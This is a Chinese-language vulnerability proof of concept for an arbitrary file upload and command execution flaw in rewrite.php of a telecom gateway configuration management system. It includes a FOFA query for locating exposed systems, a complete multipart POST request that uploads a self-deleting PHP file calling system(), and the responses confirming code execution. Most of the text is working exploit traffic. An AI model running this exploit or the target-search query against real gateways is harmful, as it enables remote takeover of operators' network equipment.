**漏洞名称**

电信网关配置管理系统 rewrite.php 任意文件上传漏洞

**漏洞影响**

电信网关配置管理系统

**漏洞描述**

电信网关配置管理系统是一种用于管理和配置电信网关设备的软件系统。该系统具有用户友好的界面，支持对网关设备进行集中管理、配置和监控。通过该系统，运营商可以轻松地对网关进行参数设置、路由配置、性能监测和故障诊断。此外，系统还提供权限管理功能，确保只有授权人员可以进行配置修改。通过实时更新和报警功能，系统能够及时发现并响应网络问题，保障网络的稳定性和安全性。

  该系统rewrite.php接口处存在任意文件上传漏洞，同时会导致任意命令执行。这会导致系统被黑客远控，请及时修复。

**FOFA搜索语句**

body="img/login_bg3.png" && body="系统登录"

**漏洞复现**

第一步，上传文件，执行系统命令echo ywivnebthzckamzybmxj写入文件

```yaml

POST /manager/teletext/material/rewrite.php HTTP/1.1
Host: x.x.x.x
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0
Content-Length: 325
Connection: close
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryzgxzdlsw
Accept-Encoding: gzip

------WebKitFormBoundaryzgxzdlsw
Content-Disposition: form-data; name="tmp_name"; filename="xfakqbto.php"
Content-Type: image/png

<?php system("echo ywivnebthzckamzybmxj");unlink(__FILE__);?>
------WebKitFormBoundaryzgxzdlsw
Content-Disposition: form-data; name="uploadtime"


------WebKitFormBoundaryzgxzdlsw--
```

响应内容如下，其中url是回显文件路径

```yaml
HTTP/1.1 200 OK
Connection: close
Content-Length: 107
Access-Control-Allow-Origin: *
Content-Type: application/json; charset=UTF-8
Date: Thu, 23 May 2024 03:45:23 GMT
Server: Apache/2.2.15 (CentOS)
X-Powered-By: PHP/5.3.3

{"ret":0,"ret_msg":"success","url":"\/xmedia\/material\/xfakqbto.php","date":"20240523_114523_1716435923."}
```

第二步，访问回显文件

http://x.x.x.x/xmedia/material/xfakqbto.php

响应数据包如下

```yaml
HTTP/1.1 200 OK
Connection: close
Content-Length: 21
Access-Control-Allow-Origin: *
Content-Type: text/html; charset=UTF-8
Date: Thu, 23 May 2024 03:45:23 GMT
Server: Apache/2.2.15 (CentOS)
X-Powered-By: PHP/5.3.3

ywivnebthzckamzybmxj
```

